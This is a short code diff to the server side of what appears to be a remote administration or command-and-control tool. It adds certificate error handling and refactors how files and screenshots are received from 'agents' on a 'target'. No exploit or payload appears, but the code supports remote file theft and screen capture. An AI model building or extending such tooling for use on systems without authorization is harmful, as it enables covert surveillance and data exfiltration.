@@ -113,7 +113,11 @@ class Server:
         self.sock.listen(5)
 
         self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-        self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")
+        try:
+            self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")
+        except FileNotFoundError:
+            print("Error: Certificate and key files not found. Please generate them and place them in the same directory as the server.py file.")
+            self.exit()
 
         print(self.banner)
         threading.Thread(target=self.accept_connections).start()
@@ -151,7 +155,7 @@ class Server:
         @param client_socket: the socket of the client
         """
 
-        json_string = client_socket.recv(4096).decode()
+        json_string = client_socket.recv(DATA_CHUNK_SIZE).decode()
         if not json_string:
             return
         json_object = json.loads(json_string)
@@ -238,7 +242,7 @@ class Server:
                     if data == SIG_EOF or not data:
                         break
                     if data == FILE_NOT_FOUND:
-                        print(f"ERROR: {file_path} not found on the target.")
+                        print(f"ERROR: The file is not found on the target.")
                         os.remove(file_path)
                         return
                     elif data == ERROR_INSUFFICIENT_PERMS:
@@ -489,10 +493,4 @@ class Server:
             screen_path = f"{args[0]}.jpg"
         else:
             screen_path = f"{secrets.token_hex(5)}.jpg"
-        with open(screen_path, 'wb') as f:
-            while True:
-                data = self.current_agent.sock.recv(DATA_CHUNK_SIZE)
-                if (data == SIG_EOF) or (not data):
-                    break
-                f.write(data)
-        print(f'Screenshot saved at {screen_path}')
+        self.get_file_without_path(screen_path)
